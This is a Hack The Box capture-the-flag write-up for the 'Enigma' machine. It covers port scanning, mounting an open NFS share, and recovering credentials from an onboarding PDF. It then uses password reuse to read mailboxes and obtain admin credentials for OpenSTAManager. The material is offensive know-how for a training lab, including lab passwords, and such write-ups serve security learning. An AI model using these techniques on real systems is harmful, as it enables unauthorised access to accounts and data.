---
link: https://app.hackthebox.com/machines/Enigma
description: Easy·Linux
release date: 2026-06-27
tags:
  - SN_11
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/131f520bad7d91e8bb5d3c11654467dd.png
solved:
solve date:
machine no.: 6
---
<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/HTB Logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Enigma Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e514a2-69e8-4e79-82ab-176c3b5a26b4-1780052657.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): 7u9y</p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 27th June, 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ ping -c 4 TARGET_IP 
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=226 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=223 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=220 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=221 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 220.106/222.527/225.675/2.151 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-28 06:48 +0000
Warning: TARGET_IP giving up on port because retransmission cap hit (10).
Nmap scan report for TARGET_IP
Host is up (0.37s latency).
Not shown: 65463 closed tcp ports (reset), 59 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
39345/tcp open  unknown
43875/tcp open  unknown
45607/tcp open  unknown
50355/tcp open  unknown
60309/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.08 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ nmap -A -p 22,80,110,111,143,993,995,2049 TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 19:44 +0000
Nmap scan report for TARGET_IP
Host is up (0.27s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING TOP CAPA UIDL STLS AUTH-RESP-CODE RESP-CODES SASL
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      46369/tcp   mountd
|   100005  1,2,3      50731/tcp6  mountd
|   100005  1,2,3      54512/udp   mountd
|   100005  1,2,3      56950/udp6  mountd
|   100021  1,3,4      35861/tcp6  nlockmgr
|   100021  1,3,4      44461/tcp   nlockmgr
|   100021  1,3,4      44726/udp   nlockmgr
|   100021  1,3,4      60836/udp6  nlockmgr
|   100024  1          37332/udp   status
|   100024  1          49537/tcp6  status
|   100024  1          50233/tcp   status
|   100024  1          58327/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: have more STARTTLS LOGIN-REFERRALS SASL-IR ID IMAP4rev1 Pre-login OK post-login listed LITERAL+ ENABLE LOGINDISABLEDA0001 IDLE capabilities
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: have more LOGIN-REFERRALS SASL-IR AUTH=PLAINA0001 IMAP4rev1 Pre-login OK post-login listed LITERAL+ ID ENABLE IDLE capabilities
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP CAPA UIDL USER AUTH-RESP-CODE RESP-CODES SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
2049/tcp open  nfs_acl  3 (RPC #100227)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   254.25 ms 10.10.14.1
2   257.86 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds
```

Your shouldn't scan those "unknown" high ports (39345, 43875, 45607, etc.). They are dynamically assigned NFS/RPC helper ports (`mountd`, `nlockmgr`, `status`) that change on every reboot. Scanning them deeply in `-A` mode adds noise and scan time with zero extra value, since:

1. They're not independently exploitable — they only exist to support the NFS service already on 2049.
2. Their port numbers will be different next time the box restarts anyway.
3. `-A` on them just returns more RPC version info you already have from the `rpcinfo` block on port 111.

They're commonly called **"high ports"** (or "ephemeral ports"), referring to any port number in the upper range, typically **above 1023** (and often more specifically **above 49152** for the formally reserved "dynamic/private" range per IANA). In practice, the term "high port" is used loosely by pentesters to mean "anything way above the well-known 0-1023 range that looks randomly assigned rather than tied to a standard service."

In your case, ports like `39345`, `43875`, `45607` etc. fall into this category for a specific reason: they're **ephemeral RPC ports**, dynamically allocated by `rpcbind` each time an RPC-based service (like NFS's `mountd`, `nlockmgr`, `status`) starts up. They aren't "well-known" or fixed — that's exactly why they show up as `unknown` in a plain `nmap -sV` scan and need `rpcinfo` (which `-A` includes) to identify what they actually belong to.
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port     | **Service** | **Version**            | **Analysis**                                                                                                                                                                      | **Simple Explanation**                                                                                                                                                   |
| -------- | ----------- | ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 22/tcp   | SSH         | OpenSSH 9.6p1 (Ubuntu) | Standard SSH access; no credentials known yet at this stage. Not the initial attack vector.                                                                                       | A back door with a key lock — lets administrators control the machine remotely. We can see it exists but don't have a key yet.                                           |
| 80/tcp   | HTTP        | nginx 1.24.0 (Ubuntu)  | Redirects to `http://enigma.htb` — requires hostname resolution via `/etc/hosts` to access.                                                                                       | The main front door — a public-facing website. When nmap knocked, it redirected us to a specific address, like a receptionist saying _"you need to ask for us by name."_ |
| 110/tcp  | POP3        | Dovecot pop3d          | Mail retrieval service; TLS cert `CN=enigma` confirms the box's internal hostname. Key pivot point for credential reuse.                                                          | A post office window — lets users collect their email. This is the unencrypted version.                                                                                  |
| 111/tcp  | RPCbind     | 2-4 (RPC #100000)      | Exposes the full RPC service map, revealing NFS (2049), `mountd`, `nlockmgr`, and `status` on dynamically assigned high ports — not independently exploitable, just NFS plumbing. | A map in a hallway — it doesn't do anything itself, but tells us what other rooms exist and where to find them.                                                          |
| 143/tcp  | IMAP        | Dovecot imapd (Ubuntu) | Plaintext IMAP; same mail backend as POP3/IMAPS, supports `STARTTLS`.                                                                                                             | Another post office window — instead of collecting mail and taking it home, this one lets you browse your inbox in place.                                                |
| 993/tcp  | SSL/IMAP    | Dovecot imapd (Ubuntu) | TLS-wrapped IMAP; same cert/hostname as other mail services.                                                                                                                      | The same in-place mail browsing window as port 143, but with a privacy screen (encrypted).                                                                               |
| 995/tcp  | SSL/POP3    | Dovecot pop3d          | TLS-wrapped POP3; `SASL(PLAIN)` auth confirmed available over TLS.                                                                                                                | The same mail collection window as port 110, but with a privacy screen (encrypted).                                                                                      |
| 2049/tcp | NFS         | 3 (RPC #100227)        | Core NFS service; export enumeration via `showmount -e` reveals available network shares worth investigating.                                                                     | A shared file storage room — like a filing cabinet on the network that other machines can access. Worth checking whether it's locked or open to anyone.                  |
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Web Service Enumeration

#### 2.2.1. Hostname Resolution

Before the web service can be accessed properly, the target's hostname needs to be mapped to its IP address locally. Without this, any attempt to browse to `enigma.htb` will fail to resolve — even though we already know the IP from our scan.

Add the mapping to your local hosts file:

**Command:** `echo "TARGET_IP enigma.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

- `echo "TARGET_IP enigma.htb"`
    - **Description:** Prints the hostname mapping string to stdout.
    - **Purpose:** Prepares the entry to be written into `/etc/hosts`.
- `sudo tee -a /etc/hosts`
    - **Description:** Appends stdin to `/etc/hosts` with elevated privileges while also printing it to the terminal.
    - **Purpose:** `/etc/hosts` is root-owned, so a standard redirect would fail. Piping into `sudo tee -a` correctly elevates only the write operation without opening a full root shell.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ echo "TARGET_IP enigma.htb" | sudo tee -a /etc/hosts
TARGET_IP enigma.htb

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ cat /etc/hosts                        
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
TARGET_IP enigma.htb
```

The system should now now resolve `enigma.htb` to `TARGET_IP` locally, allowing the web service to be accessed by hostname as intended. With that in place, the next step is to browse to the web service and inspect what's running on port 80.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.2. Initial Web Recon

With the hostname now resolving correctly, browse to `http://enigma.htb` in your browser to inspect what the web service is presenting.

![[enigma.htb.png]]


**Result:**

The page loads a polished corporate marketing site for **Enigma Corp**, presenting itself as a managed IT services company. Scrolling through the page reveals the following:

- A hero section advertising "Enterprise IT. Without the stress."
- A stats bar showing company metrics (3,800+ infrastructures managed, 12,000+ systems monitored)
- A services section listing: Managed IT Support, Hardware & Software Maintenance, On-Site Technical Assistance, Security & Compliance, Cloud Infrastructure, and Analytics & Reporting
- A contact section disclosing a support email address: **[support@enigma.htb](mailto:support@enigma.htb)**
- A footer with standard company links (About, Careers, Blog, Contact)

From an attacker's perspective, this page is mostly decorative — there are no visible login forms, file upload fields, or dynamic parameters in the URL. The page is entirely static HTML and client-side JavaScript with no obvious interactive backend to probe directly.

The one piece of actionable intelligence is the email address `support@enigma.htb`, which confirms the domain being used for internal mail. Combined with the open POP3/IMAP ports discovered during the Nmap scan, this reinforces that the mail services are the more promising avenue to explore next rather than the web surface itself.

At this stage we have two open threads worth pursuing: the mail services (POP3/IMAP on ports 110, 143, 993, 995) and the NFS share (port 2049). **POP3 and IMAP are email protocols** — they're the mechanism that allows a mail client (like Outlook) to connect to a mail server and retrieve messages from a mailbox. **NFS (Network File System) is a file-sharing protocol** — it allows a server to expose folders on its filesystem to other machines on the network, similar to a shared drive in an office environment.

The email address `support@enigma.htb` tells us that the mail infrastructure is active and in use — someone is sending and receiving mail on this domain. However, to interact with a mailbox we need credentials first. We don't have any yet.

This is where the NFS share becomes the priority. NFS shares — particularly ones named something like "onboarding" — are commonly used inside corporate environments to distribute files to new employees before they have full system access. If this share is world-readable (i.e. accessible without authentication, which the `*` wildcard in a `showmount` export list would confirm), it could contain exactly the kind of internal documentation that gets handed to a new hire on their first day — things like welcome letters, system access guides, or initial login credentials.

In other words, the NFS share is the likely source of the credentials we need to get into the mail service. That's why we will pivot there first — not because the mail service isn't interesting, but because we need a key before we can open that door.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 NFS Share Enumeration

`showmount` is a command-line utility that queries an NFS server and asks it **"what are you sharing, and with whom?"** It communicates with the `rpcbind` service (port 111) on the target to retrieve the server's export list — the list of directories it has made available to other machines on the network.

Think of it like walking up to a shared filing cabinet in an office and checking the label on the outside before opening it — you're not accessing anything yet, just finding out what's there and whether it's locked.

It's typically one of the first commands you run when you spot NFS (port 2049) open on a target, since there's no point attempting a mount until you know:

1. **What** directories are being shared
2. **Who** is allowed to access them (the `*` wildcard meaning anyone, a specific IP, or a subnet)

**Command:** `showmount -e TARGET_IP`

**Breakdown:**

- `-e`
    - **Description:** Displays the NFS server's export list — the directories it is making available to other machines on the network.
    - **Purpose:** Before attempting to mount anything, we need to know what the server is actually sharing and whether any access restrictions are in place. This is the standard first step when NFS is identified on a target.
- `TARGET_IP`
    - **Description:** The target IP address.
    - **Purpose:** Directs the query at the Enigma host's NFS service identified on port 2049 during the Nmap scan.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ showmount -e TARGET_IP
Export list for TARGET_IP:
/srv/nfs/onboarding *
```

The server is exporting a single directory: `/srv/nfs/onboarding`. The `*` alongside it is significant — in NFS, this wildcard means the share is available to **any host** with no IP-based restrictions whatsoever. No authentication, no allowlist, no restrictions. Anyone on the network can mount it.

The name "onboarding" is also immediately interesting. In a corporate environment, an onboarding share is exactly the kind of place an IT department would drop welcome documents, system access guides, and initial credentials for new employees. This lines up directly with our earlier reasoning — this share is almost certainly the source of the credentials we need to access the mail service.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

With the export path and access policy confirmed, the next step is to create a local mount point and attach the remote share to it so its contents can be inspected directly from our machine.

**Command:** `mkdir -p /tmp/nfs_mount`

**Breakdown:**

- `mkdir`
    - **Description:** Creates a new directory.
    - **Purpose:** Creates the local folder that the remote NFS share will be attached to.
- `-p`
    - **Description:** Creates parent directories as needed and suppresses errors if the directory already exists.
    - **Purpose:** Ensures the command succeeds cleanly regardless of whether `/tmp/nfs_mount` already exists on the system.
tl
With the mount point ready, attach the remote share:

**Command:** `sudo mount -t nfs TARGET_IP:/srv/nfs/onboarding /tmp/nfs_mount -o nolock`

**Breakdown:**

- `-t nfs`
    - **Description:** Specifies the filesystem type as NFS.
    - **Purpose:** Tells the mount command exactly which protocol driver to use rather than attempting to guess from the source path.
- `TARGET_IP:/srv/nfs/onboarding`
    - **Description:** The remote export path in `HOST:PATH` format.
    - **Purpose:** Targets the specific share confirmed available in the previous `showmount` query.
- `/tmp/nfs_mount`
    - **Description:** The local directory to mount the share into.
    - **Purpose:** The local access point through which the share's contents will be readable.
- `-o nolock`
    - **Description:** Disables NFS file locking.
    - **Purpose:** Prevents the mount from hanging or failing due to the NFS lock manager not being reachable — a common issue on CTF infrastructure where file locking isn't needed anyway.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ sudo mount -t nfs TARGET_IP:/srv/nfs/onboarding /tmp/nfs_mount -o nolock
[sudo] password for kali: 
```

Now list the contents of the mounted share:

**Command:** `ls -la /tmp/nfs_mount`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ ls -la /tmp/nfs_mount 
total 8
drwxr-xr-x  2 root root 4096 Feb 19 19:54 .
drwxrwxrwt 18 root root  440 Jun 30 23:16 ..
-rw-r--r--  1 root root 1751 Feb 19 19:53 New_Employee_Access.pdf
```

The share contains a single file: `New_Employee_Access.pdf`. The permissions (`-rw-r--r--`) confirm it is world-readable — any user can open it without needing root access. The filename itself is immediately telling: this is exactly the kind of document an IT department would generate for a new employee, and it very likely contains the initial system credentials we've been looking for.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.4 Extracting Credentials from the Onboarding Document

The PDF can be viewed directly in the browser by navigating to `file:///tmp/nfs_mount/New_Employee_Access.pdf` since the share is mounted locally. This gives a clean, readable view of the document exactly as it would appear to the intended recipient. 

![[New_Employee_Access.pdf.png]]

For documentation purposes however, the contents are also extracted to the terminal using `pdftotext`.

**Command:** `pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -`

**Breakdown:**

- `pdftotext`
    - **Description:** A command-line utility that extracts text content from a PDF file.
    - **Purpose:** Allows the PDF contents to be read and documented directly in the terminal without needing a GUI application.
- `/tmp/nfs_mount/New_Employee_Access.pdf`
    - **Description:** The path to the PDF file on the locally mounted NFS share.
    - **Purpose:** Targets the onboarding document discovered in the previous step.
- `-`
    - **Description:** Instructs `pdftotext` to write its output to stdout (the terminal) instead of saving it to a file.
    - **Purpose:** Keeps the output inline and immediately visible rather than creating an intermediate file on disk.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -
Enigma Corp
IT Department - New Employee System Access

Employee:

Kevin Mitchell

Department:

Operations

Provisioned by:

IT Department

Date:

2024-03-01

Webmail Access
URL:

http://mail001.enigma.htb

Username:

kevin

Password:

Enigma2024!

Please change your password upon first login.
For support contact: it@enigma.htb
This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.
```

The document is an automatically generated IT provisioning notice for a new employee — **Kevin Mitchell** from the Operations department. It contains his initial webmail credentials:

|Field|Value|
|---|---|
|URL|`http://mail001.enigma.htb`|
|Username|`kevin`|
|Password|`Enigma2024!`|

Two additional details are worth noting. First, the support contact (`it@enigma.htb`) confirms an internal IT team is actively managing this environment. Second, the document was generated by an **"Identity Management System"** — suggesting credentials across the organisation may follow a similar pattern or provisioning process, which could be relevant if password reuse is in play.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

Before proceeding, `mail001.enigma.htb` is a new hostname that needs to be added to `/etc/hosts`, otherwise the webmail URL won't resolve:

**Command:** `echo "TARGET_IP mail001.enigma.htb" | sudo tee -a /etc/hosts`

The hostname is now resolvable. `mail001.enigma.htb` will correctly direct to the target IP, allowing us to interact with the mail service using the hostname rather than the raw IP — which matters here since the webmail URL in the onboarding document explicitly uses this hostname.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.5 Accessing Kevin's Mailbox

Browsing to `http://mail001.enigma.htb` reveals a **Roundcube Webmail** login page — confirming this is the webmail interface referenced in the onboarding document. 

![[Pasted image 20260701024642.png]]

Logging in with Kevin's credentials (`kevin` / `Enigma2024!`) lands us in his inbox, which shows a single email from `sarah@enigma.htb` with the subject "Welcome to Enigma Corp, Kevin!".

![[Pasted image 20260701025234.png]]

![[Pasted image 20260701030156.png]]

While the browser gives us a clean visual view of the inbox, the same mailbox is also accessed directly via the terminal using `openssl s_client` against the POP3S service. This approach is more useful for documentation and automation purposes.

**Command:** `openssl s_client -connect mail001.enigma.htb:995 -quiet << 'EOF'`

**Breakdown:**

- `openssl s_client`
    - **Description:** OpenSSL's built-in generic SSL/TLS client — essentially a raw TCP client that wraps the connection in TLS.
    - **Purpose:** Port 995 (POP3S) requires TLS from the moment the connection opens, so a plain terminal tool like `nc` won't work here. `openssl s_client` handles the TLS handshake transparently and then lets us type raw POP3 commands as if it were a regular text connection.
- `-connect mail001.enigma.htb:995`
    - **Description:** Specifies the target host and port to connect to.
    - **Purpose:** Directs the connection to the POP3S service on the mail server.
- `-quiet`
    - **Description:** Suppresses the verbose TLS handshake and certificate output.
    - **Purpose:** Keeps the terminal output focused on the actual POP3 dialogue rather than pages of TLS negotiation details — though note the self-signed certificate warning still surfaces since `-quiet` doesn't fully suppress verification errors.
- `<< 'EOF' ... EOF`
    - **Description:** A bash heredoc — a way of feeding multiple lines of input into a command all at once.
    - **Purpose:** Allows the full POP3 conversation (`USER`, `PASS`, `LIST`, `RETR`, `QUIT`) to be scripted in one go rather than typed interactively line by line.
- `USER kevin` / `PASS Enigma2024!`
    - **Description:** Standard POP3 authentication commands.
    - **Purpose:** Authenticates to the mail server using the credentials recovered from the onboarding PDF.
- `LIST`
    - **Description:** Requests a list of all messages in the mailbox along with their sizes.
    - **Purpose:** Confirms how many emails are present before retrieving any.
- `RETR 1`
    - **Description:** Retrieves the full content of message number 1.
    - **Purpose:** Reads the only email present in Kevin's inbox.
- `QUIT`
    - **Description:** Closes the POP3 session cleanly.
    - **Purpose:** Terminates the connection properly rather than leaving it hanging.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ openssl s_client -connect mail001.enigma.htb:995 -quiet << 'EOF'
USER kevin
PASS Enigma2024!
LIST
RETR 1
QUIT
EOF
Connecting to TARGET_IP
depth=0 CN=enigma
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=enigma
verify return:1
+OK Dovecot (Ubuntu) ready.
+OK
+OK Logged in.
+OK 1 messages:
1 1473
.
+OK 1473 octets
Return-Path: <sarah@enigma.htb>
X-Original-To: kevin@localhost
Delivered-To: kevin@localhost
Received: from enigma (localhost [127.0.0.1])
        by enigma (Postfix) with ESMTP id 673F7211B9
        for <kevin@localhost>; Wed, 18 Feb 2026 21:29:13 +0000 (UTC)
Date: Wed, 18 Feb 2026 21:29:13 +0000
To: kevin@localhost
From: sarah@enigma.htb
Subject: Welcome to Enigma Corp, Kevin!
Message-Id: <20260218212913.010896@enigma>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

Hi Kevin,

Welcome to the team! We're thrilled to have you on board at Enigma Corp.

A little about us — Enigma Corp is a mid-sized technology and operations firm specializing in infrastructure management and enterprise solutions. We've been growing rapidly over the past few years and we're excited to have fresh talent joining us.

I'm Sarah from the Accounts department. I'll be your point of contact for any finance-related queries during your onboarding period.

We're still finalizing a few of your onboarding details — your system access, equipment setup, and department introductions are all being arranged by the IT team. You should be receiving your access credentials shortly via the company shared drive.

In the meantime, don't hesitate to reach out if you have any questions. We want to make sure your first few days are as smooth as possible.

Looking forward to working with you!

Best regards,
Sarah
Accounts Department
Enigma Corp
sarah@enigma.htb

.
+OK Logging out.
```

Kevin's inbox contains a single email — a welcome message sent by **Sarah** from the Accounts department (`sarah@enigma.htb`). The email itself doesn't contain any credentials, but it does introduce a new person of interest. Sarah mentions that Kevin's access credentials will be arriving "via the company shared drive" — which we've already accessed via the NFS share, confirming that chain was the intended path.

More importantly, we now have a second internal username: `sarah`. Given that Kevin's password (`Enigma2024!`) appears to have been auto-generated by the Identity Management System referenced in the onboarding PDF, it's reasonable to ask: was the same password provisioned for other accounts? This is a classic **password reuse** scenario — and the next logical step is to test whether Sarah's account uses the same credential.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.6 Password Reuse Confirmed — Accessing Sarah's Mailbox

The same credential used for Kevin's account can now be tested against Sarah's mailbox. Since both accounts were provisioned by the same IT Identity Management System — and the onboarding document explicitly warned _"Please change your password upon first login"_ — it's worth checking whether Sarah followed that instruction. Run the following command to attempt authentication as Sarah using Kevin's password:

**Command:** `openssl s_client -connect mail001.enigma.htb:995 -quiet << 'EOF'`

**Breakdown:**

- `USER sarah` / `PASS Enigma2024!`
    - **Description:** POP3 authentication commands using Sarah's username with Kevin's provisioned password.
    - **Purpose:** Tests whether the same default password was reused across multiple accounts — a common misconfiguration in environments where passwords are auto-generated and never changed.
- All other flags and commands are identical to the previous step — refer to Section 2.6 for their full breakdown.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ openssl s_client -connect mail001.enigma.htb:995 -quiet << 'EOF'
USER sarah
PASS Enigma2024!
LIST
RETR 1
QUIT
EOF
Connecting to TARGET_IP
depth=0 CN=enigma
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=enigma
verify return:1
+OK Dovecot (Ubuntu) ready.
+OK
+OK Logged in.
+OK 1 messages:
1 838
.
+OK 838 octets
Return-Path: <it@enigma.htb>
X-Original-To: sarah@localhost
Delivered-To: sarah@localhost
Received: from enigma (localhost [127.0.0.1])
        by enigma (Postfix) with ESMTP id C123C211B9
        for <sarah@localhost>; Wed, 18 Feb 2026 21:42:51 +0000 (UTC)
Date: Thu, 19 Feb 2026 10:22:00 +0000
Subject: Re: OpenSTAManager Access Request
From: it@enigma.htb
To: sarah@enigma.htb
Message-Id: <osm-reply-001@enigma.htb>
In-Reply-To: <osm-request-001@enigma.htb>
References: <osm-request-001@enigma.htb>

Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.

Regards,
IT Support
Enigma Corp

.
+OK Logging out.
```

![[Pasted image 20260701031401.png]]

The login succeeds — Sarah never changed her provisioned password, confirming credential reuse. Reading her inbox reveals a single email from the IT department containing admin credentials for an internal application called **OpenSTAManager** at `http://support_001.enigma.htb`.

Take note of the following credentials:

|Field|Value|
|---|---|
|URL|`http://support_001.enigma.htb`|
|Username|`admin`|
|Password|`Ne3s4rtars78s`|
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.7 Registering the OpenSTAManager Hostname

Before navigating to that URL, the new hostname needs to be registered in `/etc/hosts` — otherwise the address won't resolve. Add it now:

**Command:** `echo "TARGET_IP support_001.enigma.htb" | sudo tee -a /etc/hosts`

The hostname is now registered. Browsing to `http://support_001.enigma.htb` confirms the application is running and presents an **OpenSTAManager** login page. 

![[Pasted image 20260701031952.png]]

